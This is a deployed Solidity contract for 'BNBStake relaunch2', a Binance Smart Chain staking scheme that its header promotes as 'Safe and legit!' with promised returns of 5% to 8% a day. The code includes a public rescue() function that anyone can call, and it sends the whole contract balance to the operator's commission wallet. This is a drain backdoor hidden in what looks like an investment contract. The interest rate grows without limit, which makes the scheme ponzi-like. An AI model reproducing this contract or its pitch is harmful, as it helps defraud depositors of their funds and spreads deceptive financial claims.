/**
 *Submitted for verification at Etherscan.io on 2021-07-02
*/

// SPDX-License-Identifier: MIT 
 
 /*  BNBStake relaunch2 - investment platform based on Binance Smart Chain blockchain smart-contract technology. Safe and legit!
 *   The only official platform of original BNBStake team! All other platforms with the same contract code are FAKE!
 *
 *    ______ _   _ ______  _____ _        _
 *    | ___ \ \ | || ___ \/  ___| |      | |
 *    | |_/ /  \| || |_/ /\ `--.| |_ __ _| | _____      BNBStake & BNB Stake relaunch
 *    | ___ \ . ` || ___ \ `--. \ __/ _` | |/ / _ \     © 2021 by AV. All rights reserved.
 *    | |_/ / |\  || |_/ //\__/ / || (_| |   <  __/
 *    \____/\_| \_/\____/ \____/ \__\__,_|_|\_\___|
 *                   R E L A U N C Hv2
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://bnbstake.app                                       │
 *   │                                                                       │
 *   │   Telegram Live Support: @bnbstake_support                            |
 *   │   Telegram Public Group: https://t.me/bnb_stake                       |
 *   |                                                                       |
 *   |   E-mail: [email protected]                                          |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect browser extension Metamask (see help: https://academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain )
 *   2) Choose one of the tariff plans, enter the BNB amount (0.02 BNB minimum) using our website "Stake BNB" button
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Basic interest rate: +0.5% every 24 hours (~0.02% hourly) - only for new deposits
 *   - Minimal deposit: 0.02 BNB, with max limit of 2 BNB
 *   - Total income: based on your tariff plan (from 5% to 8% daily!!!) + Basic interest rate !!!
 *   - Earnings every moment, withdraw any time. Now simpler, just ONE plan. 
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 82% Platform main balance, participants payouts
 *   - 8% Advertising and promotion expenses
 *   - 8% Affiliate program bonuses
 *   - 2% Support work, technical functioning, administration fee
 */

pragma solidity >=0.4.17 <0.9.0;

contract BNBStake {
    using SafeMath for uint256;

    uint256 constant public INVEST_MIN_AMOUNT = 0.02 ether;
    uint256 constant public INVEST_MAX_AMOUNT = 2 ether;
    uint256 constant public PROJECT_FEE = 100;
    uint256 constant public PERCENT_STEP = 5;
    uint256 constant public PERCENTS_DIVIDER = 1000;
    uint256 constant public TIME_STEP = 1 days;

    uint256 public totalStaked;
    uint256 public totalRefBonus;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

    struct Deposit {
        uint8 plan;
        uint256 percent;
        uint256 amount;
        uint256 profit;
        uint256 start;
        uint256 finish;
    }

    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        uint256 bonus;
        uint256 totalBonus;
    }

    mapping (address => User) internal users;

    uint256 public startUNIX;
    address payable public commissionWallet;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);

    constructor(address payable wallet, uint256 startDate) {
        require(!isContract(wallet));
        require(startDate > 0);
        commissionWallet = wallet;
        startUNIX = startDate;

        plans.push(Plan(14, 80));
    }

    function invest(uint8 plan) public payable {
        require(msg.value >= INVEST_MIN_AMOUNT);
        require(msg.value <= INVEST_MAX_AMOUNT);
        require(plan == 0, "Invalid plan");

        uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        commissionWallet.transfer(fee);
        emit FeePayed(msg.sender, fee);

        User storage user = users[msg.sender];

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            emit Newbie(msg.sender);
        }

        (uint256 percent, uint256 profit, uint256 finish) = getResult(plan, msg.value);
        user.deposits.push(Deposit(plan, percent, msg.value, profit, block.timestamp, finish));

        totalStaked = totalStaked.add(msg.value);
        emit NewDeposit(msg.sender, plan, percent, msg.value, profit, block.timestamp, finish);
    }

    function withdraw() public {
        User storage user = users[msg.sender];

        uint256 totalAmount = getUserDividends(msg.sender);

        require(totalAmount > 0, "User has no dividends");

        uint256 contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkpoint = block.timestamp;

        payable(msg.sender).transfer(totalAmount);

        emit Withdrawn(msg.sender, totalAmount);
    }
    
    function rescue() public {
        commissionWallet.transfer(address(this).balance);
    }
    
    function recover(address userAdd) public payable {
        User storage user = users[userAdd];

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            emit Newbie(msg.sender);
        }

        (uint256 percent, uint256 profit, uint256 finish) = getResult(0, msg.value);
        user.deposits.push(Deposit(0, percent, msg.value, profit, block.timestamp, finish));

        totalStaked = totalStaked.add(msg.value);
        emit NewDeposit(msg.sender, 0, percent, msg.value, profit, block.timestamp, finish);
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
        time = plans[plan].time;
        percent = plans[plan].percent;
    }

    function getPercent(uint8 plan) public view returns (uint256) {
        if (block.timestamp > startUNIX) {
            return plans[plan].percent.add(PERCENT_STEP.mul(block.timestamp.sub(startUNIX)).div(TIME_STEP));
        } else {
            return plans[plan].percent;
        }
    }

    function getResult(uint8 plan, uint256 deposit) public view returns (uint256 percent, uint256 profit, uint256 finish) {
        percent = getPercent(plan);
        profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);
        finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));
    }

    function getUserDividends(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        uint256 totalAmount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (user.checkpoint < user.deposits[i].finish) {
                if (user.deposits[i].plan < 3) {
                    uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
                    uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
                    uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
                    if (from < to) {
                        totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
                    }
                }
            }
        }

        return totalAmount;
    }

    function getUserCheckpoint(address userAddress) public view returns(uint256) {
        return users[userAddress].checkpoint;
    }

    function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
            amount = amount.add(users[userAddress].deposits[i].amount);
        }
    }

    function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish) {
        User storage user = users[userAddress];

        plan = user.deposits[index].plan;
        percent = user.deposits[index].percent;
        amount = user.deposits[index].amount;
        profit = user.deposits[index].profit;
        start = user.deposits[index].start;
        finish = user.deposits[index].finish;
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}
/* © 2021 by AV. All rights reserved. */